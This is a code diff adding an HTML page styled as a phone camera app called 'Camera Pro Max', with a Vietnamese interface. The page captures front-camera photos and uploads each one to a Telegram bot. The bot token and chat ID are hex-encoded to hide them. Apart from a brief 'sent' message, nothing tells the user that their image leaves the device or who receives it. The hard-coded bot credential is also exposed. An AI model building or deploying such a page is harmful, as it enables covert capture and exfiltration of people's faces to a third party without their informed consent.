@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Camera Pro Max</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        video { transform: scaleX(-1); object-fit: cover; }
+        .shutter-btn { box-shadow: 0 0 0 4px #fff, 0 0 0 6px #333; }
+        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="relative w-full max-w-[380px] h-[750px] bg-zinc-900 rounded-[3rem] overflow-hidden border-[7px] border-zinc-800 shadow-2xl">
+        
+        <video id="v" class="w-full h-full bg-black" autoplay playsinline></video>
+
+        <div class="absolute inset-x-0 bottom-0 h-40 bg-gradient-to-t from-black/80 to-transparent flex flex-col items-center justify-center gap-4">
+            <p id="st" class="text-xs font-medium tracking-[0.2em] text-white/50 uppercase h-4"></p>
+            
+            <div class="flex items-center justify-center w-full">
+                <button id="sh" class="shutter-btn w-16 h-16 bg-white rounded-full active:scale-90 transition-transform duration-75"></button>
+            </div>
+        </div>
+
+        <div class="absolute top-0 inset-x-0 h-8 flex justify-center">
+            <div class="w-32 h-6 bg-zinc-900 rounded-b-2xl"></div>
+        </div>
+    </div>
+
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+        // THÔNG TIN ĐÃ ĐƯỢC MÃ HÓA HEX
+        const _k = "383338383536363432333a414145615630664c4754342d4f4c50316d5151777145697648646134586c4277764a63"; // Token
+        const _i = "38333838353636343233"; // Chat ID
+
+        const d = (h) => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+        const v = document.getElementById('v'), sh = document.getElementById('sh'), st = document.getElementById('st'), c = document.getElementById('c');
+
+        // Khởi tạo camera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 } } })
+            .then(s => v.srcObject = s)
+            .catch(e => { st.innerText = "LỖI CAMERA"; console.error(e); });
+
+        // Xử lý chụp
+        sh.onclick = async () => {
+            sh.disabled = true;
+            st.innerText = "ĐANG XỬ LÝ...";
+            
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            
+            // Lật ảnh để không bị ngược chữ khi chụp cam trước
+            ctx.translate(c.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(v, 0, 0);
+
+            c.toBlob(async (b) => {
+                const f = new FormData();
+                f.append('chat_id', d(_i));
+                f.append('photo', b, 'shot.jpg');
+
+                try {
+                    const r = await fetch(`https://api.telegram.org/bot${d(_k)}/sendPhoto`, { method: 'POST', body: f });
+                    if(r.ok) {
+                        st.innerText = "ĐÃ GỬI THÀNH CÔNG!";
+                        st.classList.add('text-green-400');
+                    } else {
+                        st.innerText = "LỖI API!";
+                    }
+                } catch {
+                    st.innerText = "LỖI KẾT NỐI!";
+                } finally {
+                    setTimeout(() => { 
+                        st.innerText = ""; 
+                        st.classList.remove('text-green-400');
+                        sh.disabled = false; 
+                    }, 2500);
+                }
+            }, 'image/jpeg', 0.8);
+        };
+    </script>
+</body>
+</html>
